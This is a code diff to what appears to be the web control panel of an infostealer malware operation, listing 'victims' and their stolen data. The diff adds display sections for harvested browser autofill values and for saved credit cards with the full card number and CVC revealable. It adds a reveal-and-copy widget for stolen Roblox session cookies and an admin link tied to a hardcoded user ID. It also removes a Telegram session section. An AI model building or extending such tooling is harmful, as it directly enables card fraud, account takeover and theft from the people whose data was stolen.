@@ -447,6 +447,7 @@
             gap: 0.5rem;
             font-family: var(--font-mono);
             font-size: 0.85rem;
+            white-space: nowrap
         }
         .password-revealed { display: none; }
         .password-cell.revealed .password-masked { display: none; }
@@ -729,6 +730,7 @@
                     <a href="builder.html" class="sidebar-link"><i class="fas fa-code"></i> Builder</a>
                     <a href="leaderboard.html" class="sidebar-link"><i class="fas fa-trophy"></i> Leaderboard</a>
                     <a href="account.html" class="sidebar-link"><i class="fas fa-circle-user"></i> Account</a>
+                    <a href="admin.html" class="sidebar-link" id="adminLink" style="display:none;"><i class="fas fa-user-shield"></i> Admin Panel</a>
                 </div>
             </div>
         </nav>
@@ -763,6 +765,9 @@
     </div>
 
     <script>
+        const ADMIN_USERS = [
+            'fb0addca-1742-4fc3-9ff8-a2eb43ab66e7',
+        ];
         (function() {
             // Supabase client
             if (typeof window.__sbClient === 'undefined') {
@@ -924,7 +929,100 @@
                         <div class="hit-card-body"><div class="info-grid">${connFields.map(f => `<div class="info-item"><span class="info-label">${f.label}</span><span class="info-value copyable" data-copy="${f.value}">${f.value}</span></div>`).join('')}</div></div>
                     </div>
                 </div>`;
-
+                // ----- Auto‑fills (collapsible, same as passwords) -----
+                const autofillsRaw = data.autofill || [];
+                let autofills = [];
+                if (Array.isArray(autofillsRaw)) {
+                    autofills = autofillsRaw;
+                } else if (typeof autofillsRaw === 'object' && autofillsRaw !== null) {
+                    autofills = Object.keys(autofillsRaw).map(key => ({ ...autofillsRaw[key], _key: key }));
+                }
+                const validAutofills = autofills
+                    .map(a => ({
+                        field: a.fieldname || a.name || 'N/A',
+                        value: a.value || a.password || a.pass || '',
+                        browser: a.browser || a.browser_name || 'Unknown',
+                        profile: a.profile || 'Default',
+                    }))
+                    .filter(a => a.value && a.value.length > 0);
+                
+                if (validAutofills.length > 0) {
+                    const perPage = 50;
+                    let currentOffset = 0;
+                    let allLoaded = false;
+                
+                    function renderAutoRows(offset, count) {
+                        const end = Math.min(offset + count, validAutofills.length);
+                        const slice = validAutofills.slice(offset, end);
+                        return slice.map(a => {
+                            const icon = browserIcons[a.browser] || 'fas fa-globe';
+                            return `<tr>
+                                <td class="copyable" data-copy="${a.field}"><span class="truncate">${a.field}</span></td>
+                                <td class="password-cell">
+                                    <span class="password-masked">********</span>
+                                    <span class="password-revealed">${a.value}</span>
+                                    <button class="reveal-btn" onclick="window.togglePassword(this)">
+                                        <i class="fas fa-eye eye-icon"></i>
+                                        <i class="fas fa-eye-slash eye-off-icon"></i>
+                                    </button>
+                                </td>
+                                <td><i class="${icon}"></i> ${a.browser}</td>
+                                <td>${a.profile}</td>
+                            </tr>`;
+                        }).join('');
+                    }
+                
+                    let autoHtml = `<div class="hit-section">
+                        <div class="section-header">
+                            <i class="fas fa-pen-fancy"></i><span>Auto‑fills</span>
+                            <span class="section-count">${validAutofills.length}</span>
+                            <i class="fas fa-chevron-down chevron"></i>
+                        </div>
+                        <div class="section-content">
+                            <div class="table-container table-scrollable" id="autoFillTableWrapper">
+                                <table class="data-table" id="autoFillTable">
+                                    <thead><tr><th>Field</th><th>Value</th><th>Browser</th><th>Profile</th></tr></thead>
+                                    <tbody id="autoFillBody">
+                                        ${renderAutoRows(0, perPage)}
+                                    </tbody>
+                                </table>
+                            </div>
+                            <div id="autoLoadMoreContainer" style="text-align:center;padding:0.5rem 0;">
+                                ${validAutofills.length > perPage ? `<button class="btn btn-secondary" id="autoLoadMoreBtn"><i class="fas fa-plus"></i> Load More (${validAutofills.length - perPage} remaining)</button>` : ''}
+                            </div>
+                        </div>
+                    </div>`;
+                
+                    html += autoHtml;
+                
+                    // Attach load more logic after DOM update
+                    setTimeout(() => {
+                        const loadBtn = document.getElementById('autoLoadMoreBtn');
+                        if (loadBtn) {
+                            loadBtn.addEventListener('click', function() {
+                                const tbody = document.getElementById('autoFillBody');
+                                if (!tbody) return;
+                                const currentRows = tbody.querySelectorAll('tr').length;
+                                const remaining = validAutofills.length - currentRows;
+                                if (remaining <= 0) {
+                                    this.disabled = true;
+                                    this.textContent = 'All loaded';
+                                    return;
+                                }
+                                const toAdd = Math.min(perPage, remaining);
+                                const newRows = renderAutoRows(currentRows, toAdd);
+                                tbody.insertAdjacentHTML('beforeend', newRows);
+                                const newCount = currentRows + toAdd;
+                                if (newCount >= validAutofills.length) {
+                                    this.disabled = true;
+                                    this.textContent = 'All loaded';
+                                } else {
+                                    this.innerHTML = `<i class="fas fa-plus"></i> Load More (${validAutofills.length - newCount} remaining)`;
+                                }
+                            });
+                        }
+                    }, 50);
+                }
                 // ----- Passwords (collapsible) -----
                 html += `<div class="hit-section">
                     <div class="section-header">
@@ -1029,6 +1127,53 @@
                     </div>`;
                 }
 
+                // ----- Billing / Credit Cards (only if data exists) -----
+                const creditCards = data.credit_cards || [];
+                if (creditCards.length > 0) {
+                    html += `<div class="hit-section">
+                        <div class="section-header">
+                            <i class="fas fa-credit-card"></i><span>Billing / Credit Cards</span>
+                            <span class="section-count">${creditCards.length}</span>
+                            <i class="fas fa-chevron-down chevron"></i>
+                        </div>
+                        <div class="section-content">
+                            <div class="table-container table-scrollable">
+                                <table class="data-table">
+                                    <thead><tr><th>Name</th><th>Card Number</th><th>Expiry</th><th>CVC</th><th>Browser</th><th>Profile</th></tr></thead>
+                                    <tbody>${creditCards.map(c => {
+                                        const number = c.number || '';
+                                        const maskedNumber = number.length > 4 ? `**** **** **** ${number.slice(-4)}` : number;
+                                        const cvc = c.cvc || '';
+                                        const maskedCvc = '******';
+                                        return `<tr>
+                                            <td class="copyable" data-copy="${c.name || ''}">${c.name || 'N/A'}</td>
+                                            <td class="password-cell">
+                                                <span class="password-masked">${maskedNumber}</span>
+                                                <span class="password-revealed">${number}</span>
+                                                <button class="reveal-btn" onclick="window.togglePassword(this)">
+                                                    <i class="fas fa-eye eye-icon"></i>
+                                                    <i class="fas fa-eye-slash eye-off-icon"></i>
+                                                </button>
+                                            </td>
+                                            <td class="copyable" data-copy="${c.expiry || ''}">${c.expiry || 'N/A'}</td>
+                                            <td class="password-cell">
+                                                <span class="password-masked">${maskedCvc}</span>
+                                                <span class="password-revealed">${cvc}</span>
+                                                <button class="reveal-btn" onclick="window.togglePassword(this)">
+                                                    <i class="fas fa-eye eye-icon"></i>
+                                                    <i class="fas fa-eye-slash eye-off-icon"></i>
+                                                </button>
+                                            </td>
+                                            <td><i class="${browserIcons[c.browser] || 'fas fa-globe'}"></i> ${c.browser || 'N/A'}</td>
+                                            <td>${c.profile || 'Default'}</td>
+                                        </tr>`;
+                                    }).join('')}</tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>`;
+                }                
+
                 // ----- WiFi Networks (collapsible, only if non-empty) -----
                 if (wifiNetworks.length > 0) {
                     html += `<div class="hit-section">
@@ -1045,18 +1190,40 @@
 
                 // ----- Roblox (collapsible, only if exists) -----
                 if (roblox) {
+                    const cookie = roblox.cookie || '';
                     html += `<div class="hit-section">
                         <div class="section-header">
                             <i class="fas fa-robot"></i><span>Roblox</span>
                             <i class="fas fa-chevron-down chevron"></i>
                         </div>
                         <div class="section-content">
-                            <div class="hit-card-body"><div class="info-grid">
-                                <div class="info-item"><span class="info-label">Username</span><span class="info-value">${roblox.name || 'N/A'}</span></div>
-                                <div class="info-item"><span class="info-label">Robux</span><span class="info-value">${roblox.robux || 0}</span></div>
-                                <div class="info-item"><span class="info-label">Premium</span><span class="info-value">${roblox.premium ? 'Yes' : 'No'}</span></div>
-                                <div class="info-item"><span class="info-label">Cookie</span><span class="info-value copyable" data-copy="${roblox.cookie || ''}"><span class="truncate">${roblox.cookie ? '********' : 'N/A'}</span></span></div>
-                            </div></div>
+                            <div class="hit-card-body">
+                                <div class="info-grid">
+                                    <div class="info-item">
+                                        <span class="info-label">Username</span>
+                                        <span class="info-value">${roblox.name || 'N/A'}</span>
+                                    </div>
+                                    <div class="info-item">
+                                        <span class="info-label">Robux</span>
+                                        <span class="info-value">${roblox.robux || 0}</span>
+                                    </div>
+                                    <div class="info-item">
+                                        <span class="info-label">Premium</span>
+                                        <span class="info-value">${roblox.premium ? 'Yes' : 'No'}</span>
+                                    </div>
+                                    <div class="info-item" style="grid-column: 1 / -1;">
+                                        <span class="info-label">Cookie</span>
+                                        <div class="cookie-display" style="display:flex;align-items:center;gap:8px;background:var(--bg-tertiary);padding:8px 12px;border-radius:var(--radius-sm);border:1px solid var(--border-color);">
+                                            <span class="info-value copyable" data-copy="${cookie}" style="flex:1;overflow:auto;font-family:var(--font-mono);font-size:0.8rem;word-break:break-all;white-space:pre-wrap;max-height:80px;overflow-y:auto;">${cookie ? '********' : 'N/A'}</span>
+                                            <button class="reveal-btn" onclick="window.toggleRobloxCookie(this)" style="flex-shrink:0;">
+                                                <i class="fas fa-eye eye-icon"></i>
+                                                <i class="fas fa-eye-slash eye-off-icon" style="display:none;"></i>
+                                            </button>
+                                            <button class="btn btn-sm btn-secondary" onclick="window.copyRobloxCookie()" style="flex-shrink:0;"><i class="fas fa-copy"></i></button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                     </div>`;
                 }
@@ -1077,18 +1244,6 @@
                     </div>`;
                 }
 
-                // ----- Telegram (collapsible, only if true) -----
-                if (telegram) {
-                    html += `<div class="hit-section">
-                        <div class="section-header">
-                            <i class="fab fa-telegram"></i><span>Telegram</span>
-                            <i class="fas fa-chevron-down chevron"></i>
-                        </div>
-                        <div class="section-content">
-                            <div class="empty">Telegram session data found.</div>
-                        </div>
-                    </div>`;
-                }
 
                 document.getElementById('detailsContent').innerHTML = html;
                 window._victimData = victim;
@@ -1120,6 +1275,35 @@
                 const cell = btn.closest('.password-cell');
                 if (cell) {
                     cell.classList.toggle('revealed');
+                }
+            };
+                        // ===== TOGGLE ROBLOX COOKIE =====
+            window.toggleRobloxCookie = function(btn) {
+                const container = btn.closest('.cookie-display');
+                const span = container.querySelector('.info-value');
+                if (!span) return;
+                const fullCookie = span.dataset.copy || 'N/A';
+                const isMasked = span.textContent === '********' || span.textContent === 'N/A';
+                if (isMasked) {
+                    span.textContent = fullCookie;
+                    btn.querySelector('.eye-icon').style.display = 'none';
+                    btn.querySelector('.eye-off-icon').style.display = 'inline';
+                } else {
+                    span.textContent = '********';
+                    btn.querySelector('.eye-icon').style.display = 'inline';
+                    btn.querySelector('.eye-off-icon').style.display = 'none';
+                }
+            };
+
+            window.copyRobloxCookie = function() {
+                const span = document.querySelector('.cookie-display .copyable');
+                if (span) {
+                    const text = span.dataset.copy || span.textContent;
+                    if (text && text !== 'N/A' && text !== '********') {
+                        navigator.clipboard.writeText(text).then(() => showToast('Copied')).catch(() => showToast('Failed', 'error'));
+                    } else {
+                        showToast('No cookie to copy', 'warning');
+                    }
                 }
             };
 
@@ -1245,6 +1429,10 @@
                     }
                 }
                 checkVip(user.id);
+                const adminLink = document.getElementById('adminLink');
+                if (adminLink && ADMIN_USERS.includes(user.id)) {
+                    adminLink.style.display = 'flex';
+                }
             
                 // Fetch profile
                 const { data: profile, error: profileError } = await supabaseClient
